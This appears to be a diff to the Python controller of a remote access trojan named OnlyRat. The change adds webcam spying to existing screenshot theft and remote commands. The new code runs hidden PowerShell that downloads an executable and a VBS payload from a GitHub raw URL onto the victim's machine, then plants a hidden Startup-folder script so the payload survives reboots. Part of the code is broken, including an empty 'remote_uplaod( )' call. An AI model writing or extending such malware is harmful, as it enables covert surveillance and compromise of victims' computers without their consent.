@@ -51,7 +51,9 @@ options_menu="""
                     [4] Grab Screenshots
                     [5] upload File
                     [6] download File
-                    [5] Restart Target PC
+                    [7] Restart Target PC
+                    [8] Install Webcam capture
+                    [9] Grab web cam pictures
 """
 # read the config file
 def read_config(config_file):
@@ -185,6 +187,10 @@ def Grab_ScreenShot(address,password,working,username):
     remote_download(address, password,screenshot_location)
     print(f"[*] screenshots downloaded successfully")
 
+
+def install_webcam():
+    remote_uplaod( )
+
     print("[*] Formating screenshots.........")
     loot_folder=f"screenshots-{username}-{current_time()}"
     os.system(f"mkdir ~/Downloads/{loot_folder}")
@@ -237,7 +243,7 @@ def update():
 
     # save the version numbers to memroy
     current_version=float(open(f"{local_path}/version.txt","r").read())
-    print(current_version)
+    print(current_version,end='\r')
     latest_version=float(open(f"{local_path}/latest.txt","r").read())
     print(latest_version)
 
@@ -249,7 +255,7 @@ def update():
         print("\n[+] update found")
         print("[*] update onlyrat ?[y/n]\n")
         # user input 
-        option=input(f"{header}")
+        option=input(f"{header}$")
         # update
         if option=="y":
             os.system(f"sh /home/kali/Desktop/Malware_development/OnlyRat/payloads/update.sh")
@@ -325,6 +331,19 @@ def cli(argument):
             download(ipv4,password)
         elif option=="7":
             remote_commands(ipv4, password, "shutdown /r")
+        elif option =='8':
+            # make the command to take the screenshot
+            print("[*] installing the screenshot.........")
+            install_webcam=f'cd {working_directory}  && powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri raw.githubusercontent.com/carlocarlo123/RATTY/main/payloads/webcam.exe -OutFile YiBLGRwMDS.exe'
+            install_confirmation=f'cd {working_directory}  && powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri raw.githubusercontent.com/carlocarlo123/RATTY/main/payloads/confirm-cam.vbs -OutFile ecuxdyWXkT.vbs'
+            # run the commnads
+            remote_commands(address, password, install_webcam)
+            # add to startup directory
+            add_to_startup=f'cd C:/Users/{target_username}/AppData/Roaming/Microsoft/Windows && cd "Start Menu" && cd Programs/Startup && echo powershell.exe  -windowstyle hidden -File {working}/YiBLGRwMDS.exe >> BEkxzUzcnT.cmd'
+            remote_commands(address, password, add_to_startup)
+
+        elif option=="9":
+            grab_webcam()
         elif option=='u':
             update()
     else:
